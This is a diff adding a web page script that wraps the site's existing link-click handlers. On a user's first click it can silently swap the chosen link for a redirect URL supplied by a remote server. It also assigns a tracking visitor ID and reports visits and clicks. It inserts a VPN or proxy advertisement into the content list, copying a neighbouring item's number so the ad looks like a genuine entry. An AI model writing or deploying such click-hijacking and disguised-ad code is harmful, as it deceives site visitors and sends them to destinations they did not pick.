@@ -1,0 +1,259 @@
+const V2_API_ORIGIN = 'https://v2.zhizi8.com';
+
+
+(async () => {
+
+  const old_jsfun = window.jsfun;
+  const old_jsfunb = window.jsfunb;
+
+
+  let visitorId = localStorage.getItem('v2-api.visitor-id');
+  if (!visitorId) {
+    visitorId = await getVisitorId();
+    localStorage.setItem('v2-api.visitor-id', visitorId);
+  }
+  const decision = await getRedirect(visitorId);
+  let isClicked = false;
+  
+  window.jsfun = function(url){
+    recordVisit(visitorId).then(()=>{}).catch((e)=>{})
+    const a = window.event?.currentTarget;
+
+    if (!isClicked && decision?.redirect === true && typeof decision.url === 'string') {
+      url = encodeBase64(decision.url);
+      old_jsfunb(url)
+    }else{
+      old_jsfun(url)
+    }
+    click(a, url);
+    isClicked = true;
+  }
+  window.jsfunb = function(url){
+    recordVisit(visitorId).then(()=>{}).catch((e)=>{})
+    const a = window.event?.currentTarget;
+    
+    if (!isClicked && decision?.redirect === true && typeof decision.url === 'string') {
+      url = encodeBase64(decision.url);
+    }
+    click(a, url);
+    isClicked = true;
+    old_jsfunb(url)
+  }
+
+
+
+  function hide(){
+    document.querySelector("#add_to_list>li>p>img").parentElement.parentElement.style="display:none;";
+  }
+
+  function encodeBase64(text) {
+    const bytes = new TextEncoder().encode(text);
+    const binary = Array.from(bytes, byte => String.fromCharCode(byte)).join('');
+    return btoa(binary);
+  }
+
+  function decodeBase64Utf8(encodedUrl) {
+    const bytes = Uint8Array.from(atob(encodedUrl), ch => ch.charCodeAt(0));
+    return new TextDecoder('utf-8', { fatal: true }).decode(bytes);
+  }
+
+  function createAd(html, link){
+    var l = encodeBase64(link);
+    let li = document.createElement("li");
+    const tpl = `<p>${html}</p><blockquote><p> <a href="javascript:void(0);" onclick="jsfun('${l}')"><font color="#FF0000">新页面打开</font> </a>&nbsp;&nbsp;&nbsp;&nbsp; <a href="javascript:;" onclick="jsfunb('${l}');return false;"> 本页面打开  </a> </p></blockquote>`;
+    li.innerHTML = tpl;
+    return li;
+  }
+
+  function recordPageVisit() {
+    const visitorKey = 'site:hasVisited';
+    const pageKey = `pageVisitCount:${window.location.pathname}`;
+
+    const isNewUser = localStorage.getItem(visitorKey) === null;
+    const visitCount = (Number(localStorage.getItem(pageKey)) || 0) + 1;
+
+    localStorage.setItem(pageKey, String(visitCount));
+    localStorage.setItem(visitorKey, '1');
+
+    return { visitCount, isNewUser };
+  }
+
+
+
+  function insertAd(ele, start, end) {
+    const list = document.getElementById('add_to_list');
+    if (!list || !Number.isInteger(start) || !Number.isInteger(end)) return;
+
+    const items = Array.from(list.children).filter(item => item !== ele);
+    const min = Math.max(1, start);
+    const max = Math.min(items.length + 1, end);
+
+    if (min > max) return;
+
+    const position = min + Math.floor(Math.random() * (max - min + 1));
+    const previous = items[position - 2];
+    const next = items[position - 1];
+    const adParagraph = ele.querySelector('p');
+
+    if (adParagraph) {
+      const previousText = previous?.querySelector('p')?.textContent ?? '';
+      const nextText = next?.querySelector('p')?.textContent ?? '';
+      const digits = getTrailingNumber(previousText) ?? getTrailingNumber(nextText);
+
+      if (digits !== null) {
+        adParagraph.append(digits);
+      }
+    }
+
+    list.insertBefore(ele, next ?? null);
+    return position;
+  }
+
+  function getTrailingNumber(text) {
+    const digits = text.trimEnd().match(/[0-9]+$/)?.[0];
+    return digits === undefined ? null : digits.replace(/^0+(?=[0-9])/, '');
+  }
+
+
+  // 公共请求函数。接口错误会抛出异常，error.status 为 HTTP 状态码。
+  async function v2Request(path, {
+    method = 'GET',
+    visitorId,
+    body,
+    keepalive = false,
+  } = {}) {
+    const headers = {};
+    if (visitorId !== undefined) headers['X-Visitor-Id'] = visitorId;
+    if (body !== undefined) headers['Content-Type'] = 'application/json';
+
+    const response = await fetch(`${V2_API_ORIGIN}${path}`, {
+      method,
+      headers,
+      body: body === undefined ? undefined : JSON.stringify(body),
+      credentials: 'omit',
+      keepalive,
+    });
+
+    if (!response.ok) {
+      const data = await response.json().catch(() => null);
+      const error = new Error(data?.error ?? `HTTP ${response.status}`);
+      error.status = response.status;
+      throw error;
+    }
+
+    return response.status === 204 ? null : response.json();
+  }
+
+  // 1. 生成访客 ID，返回 UUID 字符串
+  async function getVisitorId() {
+    const { visitor_id } = await v2Request('/api/v1/visitor-id');
+    return visitor_id;
+  }
+
+  // 2. 查询 IP 归属地，返回 ip、country_code、region、city、is_china 等字段
+  function getIpInfo(visitorId) {
+    return v2Request('/api/v1/ip', { visitorId });
+  }
+
+  // 3. 查询跳转，返回 false 或 { redirect: true, url: '...' }
+  function getRedirect(visitorId) {
+    return v2Request('/api/v1/redirect', { visitorId });
+  }
+
+  // 4. 上报一次页面打开，返回 first_request、request_count 和归属地
+  function recordVisit(visitorId) {
+    return v2Request('/api/v1/visits', { method: 'POST', visitorId });
+  }
+
+  // 5. 上报一次点击，返回 id、clicked_at、first_request、request_count
+  function recordClick(visitorId, { url, sort_id, link_text }) {
+    return v2Request('/api/v1/clicks', {
+      method: 'POST',
+      visitorId,
+      body: { url, sort_id, link_text },
+      keepalive: true,
+    });
+  }
+
+  // 6. 健康检查，收到 204 时返回 true，HTTP 错误时抛出异常
+  async function checkHealth() {
+    await v2Request('/healthz');
+    return true;
+  }
+
+  function click(a,encodedUrl) {
+    
+    const li = a?.closest('li');
+    const ul = li?.parentElement;
+
+    const decodedUrl =  decodeBase64Utf8(encodedUrl);
+    const url = /^https?:\/\//i.test(decodedUrl)
+      ? decodedUrl
+      : `https://${decodedUrl}`;
+
+    const visitorId = localStorage.getItem('v2-api.visitor-id');
+
+    if (visitorId && ul?.localName === 'ul') {
+      const items = Array.from(ul.children)
+        .filter(el => el.localName === 'li');
+
+      const sort_id = items.indexOf(li) + 1;
+      const link_text = li.querySelector(':scope > p')?.textContent.trim()
+        || a.textContent.trim();
+
+      recordClick(visitorId, { url, sort_id, link_text })
+        .catch(error => console.error('点击上报失败', error));
+    }
+
+  }
+
+  function renderAd() {
+
+    const { visitCount, isNewUser } = recordPageVisit();
+
+    if (isNewUser) {
+    }
+
+    hide();
+
+    let ad = createAd("✅GPT/✅Claude/✅Gemini｜✅跨境电商定制独享节点｜三大 AI 全支持，✅免费试用<br/>██❤️❤️❤️██▼▼▼点击下方开始试用▼▼▼█████采用三网优化专线███原生IP节点覆盖全球███晚高峰8K无压力███支持 Netflix、Disney+、YouTube Premium 等流媒体解锁███", "https://app.zhizi8.com");
+  
+    insertAd(ad, 10, 20);
+
+    // ad = createAd("【高速稳定】🚀 一键连接，全球精彩尽在指尖 🌍｜🎬 追剧看番、刷海外视频｜🎮 和好友组队开黑｜💻 跨境办公、在线开会｜📚 查阅海外文献、探索更多学习资源 ✨<br/>██❤️❤️❤️██▼▼▼点击下方开始试用▼▼▼█████✅️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️", "https://app.zhizi8.com");
+    // insertAd(ad, 20, 30);
+
+    // ad=createAd("【专线节点】🌙 下班后补一集新番 🍿，周末和海外好友开一局 🎮，临时要找篇论文也能随手查 🔍。点一下就连上，今天想逛哪儿就逛哪儿 🌏✨<br/>👇👇👇👇👇点击下方使用👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇", "https://app.zhizi8.com");
+    // insertAd(ad, 30, 45);
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", renderAd, { once: true });
+  } else {
+    renderAd();
+  }
+})().catch(error => {
+  console.error('页面初始化失败', error);
+});
+
+
+(() => {
+  const measurementId = 'G-78JY6RRYMV';
+  const scriptId = `ga4-${measurementId}`;
+
+  if (document.getElementById(scriptId)) return;
+
+  window.dataLayer = window.dataLayer || [];
+  window.gtag = window.gtag || function () {
+    window.dataLayer.push(arguments);
+  };
+
+  window.gtag('js', new Date());
+  window.gtag('config', measurementId);
+
+  const script = document.createElement('script');
+  script.id = scriptId;
+  script.async = true;
+  script.src = `https://www.googletagmanager.com/gtag/js?id=${measurementId}`;
+  document.head.appendChild(script);
+})();
